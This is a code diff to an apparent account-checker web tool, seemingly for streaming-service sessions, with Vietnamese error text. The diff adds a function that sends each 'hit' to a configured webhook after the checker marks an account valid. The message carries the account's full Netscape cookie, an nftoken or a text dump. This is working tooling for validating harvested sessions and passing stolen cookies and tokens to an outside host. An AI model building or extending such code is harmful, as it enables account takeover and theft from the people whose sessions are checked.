@@ -1029,6 +1029,28 @@ async function startCheck(){
   if(results.some(r=>['hit','free','hold'].includes(r.status))) document.getElementById('exportBar').style.display='flex';
 }
 
+async function sendWebhookFromFrontend(r, cfg) {
+  if (!cfg.notifications?.webhook?.enabled || !cfg.notifications?.webhook?.url) return;
+  const url = cfg.notifications.webhook.url;
+  const mode = cfg.notifications.webhook.mode || 'full';
+  const plans = cfg.notifications.webhook.plans || 'all';
+  if (plans !== 'all' && r.info?.plan) {
+    const planText = r.info.plan.toLowerCase();
+    if (!plans.some(p => planText.includes(p))) return;
+  }
+  let content = "🎉 **NEW HIT DETECTED!** 🎉\n";
+  if (mode === 'cookie') {
+    content += "```\n" + (r.netscape || "No cookie") + "\n```";
+  } else if (mode === 'nftoken') {
+    content += "```json\n" + JSON.stringify(r.nftoken || {}, null, 2) + "\n```";
+  } else {
+    content += "```\n" + (r.txt || buildFallbackTxt(r)) + "\n```";
+  }
+  try {
+    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content }) });
+  } catch (e) { console.error("Webhook err:", e); }
+}
+
 async function checkOne(wUrl,i,raw,cfg){
   try{
     const token = localStorage.getItem('nf_app_token');
@@ -1036,7 +1058,13 @@ async function checkOne(wUrl,i,raw,cfg){
     if (res.status === 401) { results[i].status='err'; results[i].error='Hết hạn phiên. Vui lòng F5.'; counts[results[i].status]=(counts[results[i].status]||0)+1; updateStats(); refreshCard(i); return; }
     const data=await res.json();
     if(!data.ok){ results[i].status=data.result==='EXPIRED'?'dead':'err'; results[i].error=data.error||data.reason||'Error'; }
-    else { const r=data.result; results[i].status = data.is_on_hold?'hold': r==='HIT_EXTRA'||r==='HIT'?'hit': r==='FREE'?'free':'dead'; results[i].info = data.info; results[i].nftoken= data.nftoken||null; results[i].txt = data.txt_file||null; results[i].netscape=data.netscape||null; }
+    else {
+      const r=data.result; results[i].status = data.is_on_hold?'hold': r==='HIT_EXTRA'||r==='HIT'?'hit': r==='FREE'?'free':'dead'; 
+      results[i].info = data.info; results[i].nftoken= data.nftoken||null; results[i].txt = data.txt_file||null; results[i].netscape=data.netscape||null; 
+      if (results[i].status === 'hit') {
+        sendWebhookFromFrontend(results[i], cfg);
+      }
+    }
   }catch(e){ results[i].status='err'; results[i].error=e.message||'Network error'; }
   counts[results[i].status]=(counts[results[i].status]||0)+1; updateStats(); refreshCard(i);
 }
